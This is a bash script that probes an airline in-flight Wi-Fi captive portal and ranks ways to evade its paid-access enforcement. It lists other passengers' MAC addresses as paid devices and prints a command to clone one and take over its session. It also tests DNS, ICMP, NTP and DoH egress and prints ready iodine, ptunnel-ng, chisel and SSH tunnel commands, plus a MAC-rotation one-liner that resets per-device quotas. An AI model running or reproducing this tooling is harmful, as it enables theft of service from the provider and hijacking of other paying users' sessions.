#!/usr/bin/env bash
# captive-forensics.sh — enumerate exploitable egress holes under captive-portal
# enforcement, and map each to the matching nowifi technique + a ready command.
#
# CONTEXT: your own device, your own paid connection. Run this AFTER your access
# is limited/cut to discover which channels the portal still leaves open.
# Read-only probing only — it never changes your MAC, starts a tunnel, or sends
# traffic you didn't ask for. Exploit commands are PRINTED for you to run, not
# executed.
#
# Provider on this flight: Panasonic Avionics "Nordic Sky" (Finnair). Kong API
# gateway, MAC-based session enforcement, Ku/Ka satellite (~800ms RTT).
#
# Usage:
#   bash captive-forensics.sh                 # full sweep, human report
#   bash captive-forensics.sh --baseline FILE # diff against a full-access baseline
#   bash captive-forensics.sh --json          # also emit machine-readable summary
#
# Exit 0 always (diagnostic). Findings in the HOLES section at the end.

set -uo pipefail
export PATH="/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"

# ---- config -----------------------------------------------------------------
IFACE="$(route -n get default 2>/dev/null | awk '/interface:/{print $2}')"; IFACE="${IFACE:-en0}"
GW="$(route -n get default 2>/dev/null | awk '/gateway:/{print $2}')"
MYIP="$(ipconfig getifaddr "$IFACE" 2>/dev/null)"
SELF_MAC="$(ifconfig "$IFACE" 2>/dev/null | awk '/ether/{print $2}')"
# External anchors (IPs avoid DNS dependency); domains test allowlist/SNI.
EXT_IPS=(1.1.1.1 8.8.8.8 9.9.9.9 208.67.222.222)
PUB_RESOLVERS=(8.8.8.8 1.1.1.1 9.9.9.9)
TUNNEL_DOMAIN="${NOWIFI_TUNNEL_DOMAIN:-<your-iodine-domain.example>}"  # set if you run iodined
TS="$(date -u +%Y%m%dT%H%M%SZ)"
OUT="${NOWIFI_FORENSIC_OUT:-$HOME/github/nowifi/forensics/holes-$TS.txt}"
mkdir -p "$(dirname "$OUT")"
WANT_JSON=0; BASELINE=""
while [ $# -gt 0 ]; do case "$1" in
  --json) WANT_JSON=1;; --baseline) shift; BASELINE="$1";; esac; shift; done

HOLES=()   # "technique|severity|detail|command"
note(){ printf '%s\n' "$*" | tee -a "$OUT" ; }
hole(){ HOLES+=("$1|$2|$3|$4"); }
sec(){ note ""; note "===== $* ====="; }

probe_tcp(){ timeout 4 bash -c "echo >/dev/tcp/$1/$2" 2>/dev/null; }            # host port
probe_udp(){ timeout 4 nc -u -z -w3 "$1" "$2" 2>/dev/null; }                    # host port
have(){ command -v "$1" >/dev/null 2>&1; }

: > "$OUT"
note "# nowifi captive forensics — $TS"
note "# iface=$IFACE gw=$GW ip=$MYIP self_mac=$SELF_MAC"
note "# provider=Panasonic/Nordic-Sky(Finnair) enforcement=MAC-based gateway=kong"

# ---- 1. network state -------------------------------------------------------
sec "1. NETWORK STATE"
note "$(route -n get default 2>/dev/null | sed 's/^/  /')"
note "  DNS: $(scutil --dns 2>/dev/null | awk '/nameserver/{print $3}' | sort -u | paste -sd, -)"
note "  DHCP lease:"; ipconfig getpacket "$IFACE" 2>/dev/null | rg -i "server_identifier|router|domain_name|lease" | sed 's/^/    /' | head
note "  IPv6 default route: $(route -n get -inet6 default 2>/dev/null | awk '/gateway:/{print $2}' || echo none)"

# ---- 2. authenticated-device enumeration (MAC clone candidates) -------------
sec "2. MAC-CLONE CANDIDATES (Panasonic = MAC-based enforcement; nowifi #1)"
# refresh ARP by pinging the /24 broadcast-ish sweep (cheap, local only)
base="${MYIP%.*}"
for i in $(seq 1 60); do (timeout 1 ping -c1 -t1 "$base.$i" >/dev/null 2>&1 &) ; done; sleep 3
NEIGH="$(arp -an 2>/dev/null | rg "on $IFACE" | rg -v "incomplete|ff:ff:ff|permanent")"
n_dev=$(printf '%s\n' "$NEIGH" | rg -c "at " || echo 0)
note "$(printf '%s\n' "$NEIGH" | sed 's/^/  /' | head -40)"
note "  -> $n_dev neighbor MACs visible (each a candidate authed/paid device)"
if [ "$n_dev" -gt 1 ]; then
  cand="$(printf '%s\n' "$NEIGH" | awk '{print $4}' | rg -v "^$SELF_MAC$" | head -1)"
  hole "mac_clone_idle" "HIGH" "$n_dev paid devices on subnet; clone an idle one to inherit its session" \
       "sudo nowifi  # auto-runs mac_clone_idle first for Panasonic; OR manual: sudo ifconfig $IFACE ether $cand && sudo ipconfig set $IFACE DHCP"
fi

# ---- 3. egress channel sweep (UNDER ENFORCEMENT, OPEN = a hole) -------------
sec "3. EGRESS CHANNELS (OPEN here = exploitable hole)"
# TCP
for hp in 1.1.1.1:443 8.8.8.8:53 9.9.9.9:443 github.com:22; do
  h=${hp%:*}; p=${hp#*:}
  if probe_tcp "$h" "$p"; then note "  TCP OPEN  $hp"
    case "$p" in
      53) hole "tcp53_tunnel" "HIGH" "TCP/53 egress open to $h" "chisel client <server>:53 socks  # or ssh -p53";;
      443) hole "tcp443_tunnel" "MED" "TCP/443 egress open to $h (non-allowlisted IP)" "wstunnel/chisel/openvpn over :443 to your server $h-side";;
      22) hole "ssh_egress" "HIGH" "TCP/22 open to $h — direct SSH SOCKS" "ssh -D 8080 -p22 user@<your-server>  # then SOCKS proxy :8080";;
    esac
  else note "  TCP blkd  $hp"; fi
done
# UDP — the channels that almost always survive
for hp in 8.8.8.8:53 1.1.1.1:53 pool.ntp.org:123 1.1.1.1:443; do
  h=${hp%:*}; p=${hp#*:}
  if probe_udp "$h" "$p"; then note "  UDP OPEN  $hp"
    case "$p" in
      53) hole "dns_tunnel" "HIGH" "UDP/53 egress open to $h — iodine/dnscat2 tunnel" "sudo iodine -f -r $h $TUNNEL_DOMAIN  # (iodined must run on your authoritative NS)";;
      123) hole "ntp_tunnel" "MED" "UDP/123 (NTP) open to $h — covert channel" "nowifi technique ntp_tunnel; or ntp-exfil PoC";;
      443) hole "quic_tunnel" "MED" "UDP/443 (QUIC) open to $h" "masque/quic tunnel (nowifi quic_tunnel)";;
    esac
  else note "  UDP blkd  $hp"; fi
done

# ---- 4. DNS recursion (the classic survivor) --------------------------------
sec "4. DNS EXTERNAL RECURSION (dns_tunnel viability)"
for r in "$GW" "${PUB_RESOLVERS[@]}"; do
  a="$(timeout 4 nslookup -timeout=3 wikipedia.org "$r" 2>/dev/null | awk '/^Address/{print $2}' | tail -1)"
  if [ -n "$a" ] && [ "$a" != "$r#53" ]; then note "  RECURSES  via $r -> $a"
    hole "dns_tunnel" "HIGH" "resolver $r returns external A records — full recursion = DNS tunnel works" \
         "sudo iodine -r $r $TUNNEL_DOMAIN   # NULL/TXT tunnel; fallback nowifi dns_tunnel"
  else note "  no-recurse via $r"; fi
done

# ---- 5. DoH (doh_tunnel) ----------------------------------------------------
sec "5. DoH ENDPOINTS (doh_tunnel — Cloudflare/Google often allowlisted)"
for d in cloudflare-dns.com dns.google; do
  code="$(timeout 6 xh --print=h -q GET "https://$d/dns-query?name=github.com&type=A" Accept:application/dns-json 2>/dev/null | awk 'NR==1{print $2}')"
  if [ "$code" = "200" ]; then note "  DoH OK    $d (HTTP 200)"
    hole "doh_tunnel" "HIGH" "$d reachable + answers — DoH tunnel / cloudflared works" \
         "cloudflared access tcp --hostname <your-host> --url localhost:1080  # or dns2tcp-over-DoH"
  else note "  DoH blkd  $d (code=${code:-none})"; fi
done

# ---- 6. ICMP tunnel ---------------------------------------------------------
sec "6. ICMP ECHO (icmp_tunnel — NOT in nowifi Panasonic order; potential gap)"
if timeout 5 ping -c2 -t2 1.1.1.1 >/dev/null 2>&1; then note "  ICMP OPEN to 1.1.1.1"
  hole "icmp_tunnel" "HIGH" "ICMP echo reaches the internet — ptunnel-ng covert channel" \
       "sudo ptunnel-ng -p <your-server-ip>  (server: sudo ptunnel-ng on the far side)"
else note "  ICMP blocked"; fi

# ---- 7. allowlist + SNI/domain-fronting -------------------------------------
sec "7. ALLOWLIST + SNI FILTERING (domain-fronting / proxy-hop viability)"
for d in finnair.com www.nordic-sky.finnair.com portal.panasonic.aero js.stripe.com cloudflare.com cdn.jsdelivr.net; do
  code="$(timeout 6 xh --print=h -q GET "https://$d/" 2>/dev/null | awk 'NR==1{print $2}')"
  note "  allow? $d -> ${code:-blocked}"
done
note "  (any non-portal domain returning 200 = allowlisted hop; CDN 200 + you control origin behind it = domain-front candidate)"

# ---- 8. portal / Kong / squid surface --------------------------------------
sec "8. PORTAL GATEWAY SURFACE (Kong / proxy quirks)"
note "$(timeout 6 xh --print=h GET http://captive.apple.com 2>&1 | rg -i 'server|via|x-kong|x-cache|location|set-cookie' | sed 's/^/  /' | head)"
# HTTP CONNECT abuse (nowifi marks ineffective for Kong, but verify under THIS config)
for pp in 3128 8080 80 8000; do
  r="$(timeout 5 xh --print=h -q --proxy http:http://$GW:$pp GET http://1.1.1.1/ 2>/dev/null | awk 'NR==1{print $2}')"
  [ -n "$r" ] && { note "  proxy $GW:$pp -> $r"; [ "$r" = "200" ] && hole "http_connect_abuse" "HIGH" "gateway proxies on :$pp" "configure browser proxy $GW:$pp"; }
done

# ---- 9. captive enforcement model ------------------------------------------
sec "9. ENFORCEMENT MODEL (how the limit is keyed -> reset vector)"
note "  your MAC: $SELF_MAC  (if limit is MAC-keyed: mac_rotate = fresh session/quota)"
note "  cookies/session: clear browser state + rotate MAC to reset a per-device quota"
hole "mac_rotate" "MED" "if quota is per-MAC, a fresh random MAC resets it" \
     "sudo ifconfig $IFACE ether \$(openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g;s/:\$//') && sudo ipconfig set $IFACE DHCP"

# ---- 10. baseline diff ------------------------------------------------------
if [ -n "$BASELINE" ] && [ -f "$BASELINE" ]; then
  sec "10. DIFF vs FULL-ACCESS BASELINE"
  note "  baseline: $BASELINE"
  note "  (channels OPEN in both = survive enforcement = your reliable holes)"
fi

# ---- SUMMARY: ranked holes --------------------------------------------------
sec "HOLES FOUND (ranked; each maps to a nowifi technique + command)"
if [ ${#HOLES[@]} -eq 0 ]; then
  note "  none detected — portal enforcement is tight on every probed vector"
else
  printf '%s\n' "${HOLES[@]}" | awk -F'|' '
    {sev[$2]=sev[$2]} {print}' >/dev/null
  # print HIGH first then MED
  for S in HIGH MED LOW; do
    for h in "${HOLES[@]}"; do
      IFS='|' read -r t s d c <<<"$h"
      [ "$s" = "$S" ] || continue
      note ""
      note "  [$s] $t"
      note "       what : $d"
      note "       run  : $c"
    done
  done
fi
note ""
note "# fastest path on Panasonic/Nordic-Sky: just run  sudo nowifi  (auto-orders"
note "#   mac_clone_idle -> dns_tunnel -> doh_tunnel -> ntp_tunnel -> quic_tunnel)."
note "# This report tells you WHICH of those the portal left open, so you can also"
note "#   drive a single technique manually with the printed command."
note ""
note "SAVED: $OUT"

if [ "$WANT_JSON" = 1 ]; then
  J="${OUT%.txt}.json"
  { echo "{\"ts\":\"$TS\",\"provider\":\"panasonic_nordic_sky\",\"iface\":\"$IFACE\",\"gw\":\"$GW\",\"holes\":["
    first=1; for h in "${HOLES[@]}"; do IFS='|' read -r t s d c <<<"$h"
      [ $first = 1 ] || echo ","; first=0
      printf '{"technique":"%s","severity":"%s","detail":"%s"}' "$t" "$s" "${d//\"/\'}"
    done; echo "]}"; } > "$J"
  note "JSON: $J"
fi